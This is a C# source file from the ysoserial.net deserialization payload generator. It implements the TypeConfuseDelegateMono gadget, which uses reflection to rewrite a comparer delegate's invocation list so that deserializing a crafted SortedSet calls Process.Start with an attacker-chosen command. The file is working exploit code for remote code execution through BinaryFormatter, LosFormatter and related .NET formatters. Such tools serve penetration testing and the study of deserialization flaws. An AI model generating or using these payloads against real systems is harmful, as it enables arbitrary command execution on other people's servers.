using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace ysoserial.Generators
{
    class TypeConfuseDelegateMonoGenerator : GenericGenerator
    {
        public override string Name()
        {
            return "TypeConfuseDelegateMono";
        }

        public override string Description()
        {
            return "TypeConfuseDelegate gadget - Tweaked to work with Mono";
        }

        public override string Credit()
        {
            return "James Forshaw";
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "NetDataContractSerializer", "LosFormatter" };
        }

        public override object Generate(string cmd, string formatter, Boolean test, Boolean minify)
        {
            return Serialize(TypeConfuseDelegateGadget(cmd), formatter, test, minify);
        }

        /* this can be used easily by the plugins as well */
        public object TypeConfuseDelegateGadget(string cmd)
        {
            String potentialCmdFile = cmd.Replace("cmd /c ", ""); // as we add this automatically to the command

            if (File.Exists(potentialCmdFile))
            {
                Console.Error.WriteLine("Reading command from file " + cmd + " ...");
                cmd = File.ReadAllText(potentialCmdFile);
            }

            Boolean hasArgs;
            string[] splittedCMD = Helpers.CommandArgSplitter.SplitCommand(cmd, out hasArgs);
            
            Delegate da = new Comparison<string>(String.Compare);
            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
            IComparer<string> comp = Comparer<string>.Create(d);
            SortedSet<string> set = new SortedSet<string>(comp);
            set.Add(splittedCMD[0]);
            if (hasArgs)
            {
                set.Add(splittedCMD[1]);
            }
            else
            {
                set.Add(""); // this is needed (as it accepts two args?)
            }

            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = d.GetInvocationList();
            // Modify the invocation list to add Process::Start(string, string)
            invoke_list[0] = new Func<string, string, Process>(Process.Start);
            invoke_list[1] = new Func<string, string, Process>(Process.Start);
            fi.SetValue(d, invoke_list);

            return set;
        }

    }
}
